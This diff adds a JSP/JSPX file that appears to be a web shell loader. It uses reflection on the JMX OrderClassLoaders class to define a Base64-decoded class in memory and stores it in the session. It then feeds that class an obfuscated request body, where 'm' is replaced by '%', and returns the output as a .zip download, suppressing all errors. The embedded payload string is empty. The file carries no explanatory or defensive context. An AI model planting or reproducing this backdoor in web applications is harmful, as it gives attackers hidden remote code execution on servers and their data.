@@ -1,0 +1,68 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
+    <jsp:scriptlet><![CDATA[
+        try {
+            if (session.getAttribute("ti") == null) {
+               String ti = "";
+                byte[] var2 = null;
+                try {
+                    Class z = Thread.currentThread().getContextClassLoader().loadClass("com.sun.org.apache.xml.internal.security.utils.Base64");
+//                    var2 = (byte[]) z.getMethod("decode"), new Class[]{String.class}).invoke(null, new Object[]{ti});
+                   var2 = (byte[]) z.getMethod("decode").invoke(null, new Object[]{ti});
+
+                } catch (Exception e) {
+                    try {
+                        Class<?> zz = Thread.currentThread().getContextClassLoader().loadClass("java.util.Base64");
+                        Object zzd = zz.getMethod("getDecoder", null).invoke(zz, null);
+                        var2 = (byte[]) zzd.getClass().getMethod("decode", new Class[]{String.class}).invoke(zzd, new Object[]{ti});
+                    } catch (Exception exception) {
+                    }
+                }
+
+                Class PB = Class.forName("com.sun.jmx.remote.util.OrderClassLoaders");
+
+                java.lang.reflect.Constructor c = PB.getDeclaredConstructor(new Class[]{ClassLoader.class, ClassLoader.class});
+                c.setAccessible(true);
+                Object tadfasf = Thread.currentThread().getContextClassLoader();
+                Object d = c.newInstance(new Object[]{tadfasf, tadfasf});
+                java.lang.reflect.Method lll = PB.getSuperclass().getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
+                lll.setAccessible(true);
+                Class zz = (Class) lll.invoke(d, new Object[]{var2, 0, var2.length});
+                session.setAttribute("ti", zz);
+            }
+
+
+            if (session.getAttribute("ti") != null) {
+                java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(request.getInputStream()));
+                String line = null;
+                StringBuilder sb = new StringBuilder();
+                while ((line = br.readLine()) != null) {
+                    sb.append(line);
+                }
+                String yuan = sb.toString();
+                String datas = "";
+                String dd[] = yuan.split("&");
+                for (int i = 0; i < dd.length; i++) {
+                    String tmp = dd[i].substring(dd[i].indexOf("=") + 1);
+                    datas = datas + tmp;
+                }
+                datas = datas.replace("m", "%");
+                datas = java.net.URLDecoder.decode(datas);
+                byte[] poc_data = datas.getBytes();
+                request.setAttribute("parameters", poc_data);
+                java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
+                Object f = ((Class) session.getAttribute("ti")).newInstance();
+                f.equals(arrOut);
+                f.equals(pageContext);
+                f.toString();
+                String res = System.currentTimeMillis() + ".zip";
+                String down = "attachment; filename=" + res;
+                response.setHeader("content-disposition", down);
+                ServletOutputStream outt = response.getOutputStream();
+                outt.write(arrOut.toByteArray());
+                outt.flush();
+                outt.close();
+            }
+        } catch (Exception e) {
+        }
+        ]]></jsp:scriptlet>
+</jsp:root>
